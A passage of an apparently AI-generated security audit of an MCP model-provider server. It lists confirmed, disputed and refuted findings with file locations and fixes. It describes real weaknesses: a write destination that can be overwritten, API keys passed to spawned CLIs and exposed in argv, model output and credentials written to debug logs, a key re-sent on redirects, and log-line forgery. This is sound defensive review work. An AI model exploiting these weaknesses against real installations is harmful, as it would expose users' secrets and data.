**🟠 Medium · CONFIRMED · ✅ FIXED · `tools/chat.py:221`**

Reads flow through `resolve_and_validate_path` (blocks system dirs and home root); the chat *write* destination is validated only as "absolute + existing directory." So `pal_generated.code` can be created/overwritten in locations reads forbid (home root, writable system-ish dirs). The more dangerous write operation is held to a weaker standard.

- **Fix:** Pass the expanded working directory through `resolve_and_validate_path` (or at minimum `is_dangerous_path` + `is_home_directory_root`) before any unlink/write.

---

## Epic E — provider integration

Correctness bugs in the provider abstraction. Several make advertised features silently non-functional; none are remote-exploitable, but they cause hard failures and wrong routing.

### E-1 · Responses-endpoint models break on image input
**🟠 Medium · CONFIRMED · `providers/openai_compatible.py:416`**

`generate_content` builds a content *array* for vision models, but `_generate_with_responses_endpoint` wraps message content as `{"type": "input_text", "text": content}` — assigning the whole list to `text` — and never maps images to `input_image`. `conf/openai_models.json` marks `gpt-5.2-pro`, `o3-pro`, `gpt-5-codex`, `gpt-5.1-codex` as both `supports_images` and `use_openai_response_api`, so every image request to them yields a 400 (non-retryable → fails on first attempt + trips the breaker). Vision is completely unusable on these four models.

- **Fix:** In `_generate_with_responses_endpoint`, iterate list content, mapping text→`input_text` and `image_url`→`input_image`; keep string wrapping for plain strings.

### E-2 · CUSTOM/AZURE allowlists invisible to `ModelRestrictionService`
**🟠 Medium · CONFIRMED · `utils/model_restrictions.py:51`**

`ENV_VARS` maps only OPENAI/GOOGLE/XAI/OPENROUTER/DIAL — not CUSTOM or AZURE. So `is_allowed(CUSTOM|AZURE, ...)` always returns True. Generation enforces the allowlist (fails closed), but listing and auto-mode fallback ignore it.

- **Impact:** `listmodels`/schema enums expose restricted models; auto-mode can pick a disallowed model that then hard-fails at the boundary, and the error's suggested model is the same disallowed one (retry fails identically).
- **Fix:** Add `ProviderType.CUSTOM → "CUSTOM_ALLOWED_MODELS"` and `ProviderType.AZURE → "AZURE_OPENAI_ALLOWED_MODELS"` to `ENV_VARS`, or have `_get_allowed_models_for_provider`/`list_models` consult `provider.allowed_models`.

### E-3 · Token usage zeroed for Responses-API models
**🟡 Low · CONFIRMED · `providers/openai_compatible.py:468`**

The SDK `Response` always has a `usage` attribute, so `_extract_usage` (which reads chat-completions field names `prompt_tokens`/`completion_tokens`) always wins and the correct `input_tokens`/`output_tokens` fallback is dead code — usage is reported as zero.

- **Fix:** In `_extract_usage`, fall back to `input_tokens`/`output_tokens`; delete the dead `elif`.

### E-4 · `"429" in error_str` misclassifies non-rate-limit errors as retryable
**🟡 Low · CONFIRMED · `providers/openai_compatible.py:894`**

The substring check runs before structured status classification, so any error whose message merely contains `429` (token counts like `154296 tokens`, request IDs, byte sizes) is retried as a rate-limit — wasting retries on permanent 4xx errors.

- **Fix:** Classify by structured `status_code` first; use the `"429"` substring only as a last-resort heuristic when no status code is available.

### E-5 · `get_available_models` last-write-wins on name collisions (latent)
**🟡 Low · 🔵 DISPUTED · `providers/registry.py:271`**

`get_available_models` iterates providers in registration order (OpenRouter registered last) and does `models[name] = provider_type`, so on a collision the last-registered provider wins — the opposite of `get_provider_for_model`'s `PROVIDER_PRIORITY_ORDER` (native first).

- **Dispute:** The second skeptic showed the collision **does not actually occur today**: every caller passes `respect_restrictions=True`, under which OpenRouter suppresses aliases (`openrouter.py:161-163`) and emits only canonical prefixed names (`google/gemini-2.5-flash`), which never collide with native aliases (`flash`). The empirical key intersection is empty. This is a **latent fragility** (it would misattribute only if `respect_restrictions=False` were ever wired to a caller), not an observable defect.
- **Fix (defensive):** Iterate in `PROVIDER_PRIORITY_ORDER` and use `models.setdefault(...)` so the invariant holds even if alias suppression changes.

### E-6 · Responses endpoint passes unsupported `max_completion_tokens`
**🟡 Low · CONFIRMED · `providers/openai_compatible.py:443`**

The Responses API takes `max_output_tokens`; the code sets `max_completion_tokens`, so any request with an output cap raises `TypeError`.

- **Fix:** Rename the key to `max_output_tokens`.

---

## Epic F — secrets & logging

Default configuration writes sensitive material to disk and process argv with no redaction.

### F-1 · All provider API keys are inherited by every clink-spawned CLI
**🟡 Low · CONFIRMED · `clink/agents/base.py:364`** *(also surfaced as [A-12](#a-12--full-server-environment-propagated-to-every-spawned-cli))*

`_build_environment` does `os.environ.copy()` and only augments. `utils/env.py` loads the entire `.env` into `os.environ` at import, so every configured provider secret is handed to every spawned third-party CLI — even secrets the user's own shell never had, and even to a CLI that only needs one provider's key.

- **Fix:** Build the child env from an allowlist (`PATH`, `HOME`, `TMPDIR`, locale/`TERM`, proxy vars, `UNISON_CLINK_DEPTH`) plus only the auth vars that specific CLI needs (declared per-client in `conf/cli_clients/*.json`). At minimum strip the known Unison provider key variables.

### F-2 · Responses-API path logs full model output at DEBUG (shipped default)
**🟠 Medium · CONFIRMED · `providers/openai_compatible.py:384`**

`_safe_extract_output_text` logs the complete untruncated model output at DEBUG; `LOG_LEVEL` defaults to `DEBUG` (`server.py:28`) with no redaction filter. Reachable with stock config (several models set `use_openai_response_api: true`). Since precommit/codereview/debug embed source and diffs, and models echo that material back, credentials present in reviewed code land in `logs/mcp_server.log` (~120 MB of retained rotation). Line 458-460 additionally logs prompt prefixes at INFO; line 384's raw f-string allows model-controlled newlines to forge log lines.

- **Fix:** Replace line 384 with a length-only log (after the None/type checks); delete the `dir(response)` dump at 378; demote/trim the 458-460 request log to structural metadata. Add a redaction `logging.Filter`; change the shipped `LOG_LEVEL` default to `INFO`.

### F-3 · DIAL `Api-Key` header re-sent on cross-origin redirects
**🟡 Low · CONFIRMED · `providers/dial.py:89`**

DIAL uses a custom `Api-Key` header baked into a shared `httpx.Client` with `follow_redirects=True`. `httpx` strips only *standard* sensitive headers (`Authorization`/`Cookie`) on cross-origin redirects — a custom header leaks the credential to the redirect target.

- **Fix:** Set `follow_redirects=False`, or attach `Api-Key` via an `httpx.Auth`/event hook that strips it on origin change.

### F-4 · Log injection (CWE-117) of tool name / continuation_id / clientInfo
**🟡 Low · CONFIRMED · `handlers/tool_handlers.py:96`**

Raw `name`, `continuation_id`, and clientInfo are logged before validation (the UUID check happens later), so control characters (`\r\n`) let an attacker forge log lines in `mcp_server.log`/`mcp_activity.log`.

- **Fix:** Sanitize control chars and length-cap these fields at the boundary before the first log statement.

### F-5 · `run-server.sh` prints real API keys to stdout and argv
**🟡 Low · CONFIRMED · `run-server.sh:1307`**

`check_claude_cli_integration()` builds `claude mcp add ... -e KEY="value" ...` with real key values, echoes the fully-expanded command on several paths, and exposes keys in the `claude` process argv (world-visible via `ps`) on every run.

- **Fix:** Print masked `-e KEY="***"` in all echo paths; register via `claude mcp add-json` from a `0600` temp file instead of passing secrets on the command line.

---

## Epic G — input validation & crashes

Client-supplied values reach code that assumes a shape the schema doesn't enforce.

### G-1 · Non-string `continuation_id` raises `AttributeError` past the UUID guard
**🟡 Low · 🔵 DISPUTED · `utils/conversation_store.py:127`**

`_is_valid_uuid` catches only `ValueError`, but `uuid.UUID(123)` raises `AttributeError`.

- **Dispute:** The second skeptic showed the normal path is neutralized: the MCP SDK validates arguments against `inputSchema` before our handler runs, and every registered tool declares `continuation_id` as `{"type":"string"}` with `additionalProperties:False`, so `{"continuation_id":123}` is rejected cleanly ("123 is not of type 'string'") and never reaches `_is_valid_uuid`. The only residual path is an **unregistered** tool name (schema validation skipped), which returns "Unknown tool" anyway and whose `AttributeError` is caught by the SDK's `except Exception`. **Residual = cryptic error string on a degenerate edge case; nothing crashes.**
- **Fix (cheap hardening):** `if not isinstance(val, str): return False` at the top of `_is_valid_uuid`.

### G-2 · Malformed `issues_found` items crash workflow summary builders
**🟡 Low · CONFIRMED · `tools/workflow/workflow_mixin.py:1442`**

`WorkflowRequest.issues_found` is typed `list[dict]` with no item validation; `_prepare_work_summary` calls `issue.get("severity", "unknown").upper()`, so a `None`/non-string severity raises `AttributeError`.

- **Fix:** Add a `field_validator` on `issues_found` that coerces `severity`/`description`/`type` to strings and drops/normalizes malformed entries.

---

## Disputed findings (passes split — low confidence)

Four findings were confirmed by one independent skeptic pass and refuted by the other. Treat as low-confidence; the inline entries carry the detail:

- [A-8](#a-8--deeply-nested-json-from-a-cli-bypasses-the-parsererror-contract) — nested-JSON `RecursionError` (hardening nit; SDK catches it).
- [E-5](#e-5--get_available_models-last-write-wins-on-name-collisions-latent) — registry name-collision (latent; no observable collision today).
- [G-1](#g-1--non-string-continuation_id-raises-attributeerror-past-the-uuid-guard) — non-string `continuation_id` (cosmetic error on a degenerate path).
- **CustomProvider "DoS amplification" (rebuilds OpenRouter registry on every unknown model)** — `providers/custom.py`. The registry-rebuild mechanic is real; the first pass refuted the DoS impact by measurement, the second pass confirmed it. **✅ Addressed:** the OpenRouter fallback registry is now cached at class level (`_openrouter_registry`) so unknown-model resolution no longer rebuilds the LiteLLM catalog per lookup.

## Refuted findings (both passes agree — documented for transparency)

- **`remaining_tokens=0` starves expert-analysis file embedding** — `tools/workflow/workflow_mixin.py`. Both passes refuted *this specific* harm: the starved content never reaches the expert model on the path described. The starvation *mechanism* is real, but its genuine, confirmed impact is captured in [B-2](#b-2--mcp-boundary-wipes-continuation-context).

---

## Suggested execution order

1. **Sprint 1 (security):** D-1, A-1, A-4, F-2, F-1/A-12, D-3, D-4, D-2 — close the sandbox-escape and secret-leak surface, and make `read_only`/`readOnlyHint` honest.
2. **Sprint 2 (correctness):** B-1, B-2, C-1/C-2, C-3 — fix the continuation/state-contamination bugs that affect every multi-turn and concurrent interaction.
3. **Sprint 3 (robustness):** remaining clink parser guards (A-8…A-11), provider correctness (E-1…E-6), breaker/streaming (C-4…C-8), storage hardening (B-3…B-5), logging (F-3…F-5), input validation (G-1, G-2).

---

*Generated by a 12-finder adversarial workflow with two independent skeptic verification passes (~4.8M tokens total). Findings tagged **CONFIRMED** survived both passes; **🔵 DISPUTED** findings split between passes and are low-confidence. The MCP SDK's schema validation + handler-level `try/except` (verified against the installed SDK) neutralizes several "crash/DoS" candidates into error-message-quality nits. Line numbers reflect the audited working tree and may drift as the code changes.*
